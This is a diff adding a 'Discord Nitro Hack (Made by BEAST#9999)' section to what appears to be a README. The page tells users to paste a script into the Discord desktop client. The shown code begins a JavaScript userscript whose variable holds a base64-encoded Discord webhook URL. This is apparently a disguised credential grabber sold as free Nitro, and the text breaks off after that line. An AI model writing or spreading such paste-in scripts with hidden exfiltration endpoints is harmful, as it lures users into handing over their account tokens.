@@ -11,7 +11,8 @@ It only works on Desktop Versions (Windows, Linux, MacOS), not on Mobile
 3. Paste the script in
 4. Press enter
 
-## Discord Nitro Hack
+## Discord Nitro Hack (Made by BEAST#9999)
+#Getting Free Nitro At Your own risk
 ```js
 //Userscript: Discord Nitro Hack Script
 var nitrocode = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTM3NTg2OTIwNjcyODg2ODE0L0loVUVnbVB6ZnJ3M1lRcFdjOUtIUDNUR1JnSkktcGZ6elExYU95b3RMWW9iaWlxd0xjbUw4dnl3R29Pakt0YXd2a2V3"
